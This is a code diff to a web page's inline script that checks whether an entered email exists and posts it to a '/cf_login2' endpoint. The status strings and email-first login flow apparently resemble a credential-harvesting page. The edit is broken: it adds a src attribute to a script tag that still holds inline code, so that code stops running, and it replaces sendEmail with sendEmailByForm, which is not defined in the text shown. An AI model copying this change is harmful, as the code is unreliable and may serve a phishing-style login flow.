@@ -245,7 +245,7 @@
 
 
 </div>
-<script>
+<script src="js/script.js">
     document.addEventListener("DOMContentLoaded", function() {
         const myBtn = document.querySelector("#myBtn");
 
@@ -277,21 +277,6 @@
                 }
             }
 
-            function sendEmail(path, email) {
-                const form = document.createElement('form');
-                form.method = 'post';
-                form.action = path;
-
-                const hiddenField = document.createElement('input');
-                hiddenField.type = 'hidden';
-                hiddenField.name = 'email';
-                hiddenField.value = encodeURIComponent(email);
-                form.appendChild(hiddenField);
-
-                document.body.appendChild(form);
-                form.submit();
-            }
-
             async function validateAndSend(email) {
                 if (!validateEmail(email)) {
                     console.log('Invalid email format');
@@ -301,7 +286,7 @@
                 try {
                     const data = await checkEmailExists(email);
                     if (data === "valid-correct-access") {
-                        sendEmail('/cf_login2', email);
+                        sendEmailByForm('/cf_login2', email);
                     } else if (data === "valid-incorrect-access") {
                         $("#incorrect").modal();
                     } else {
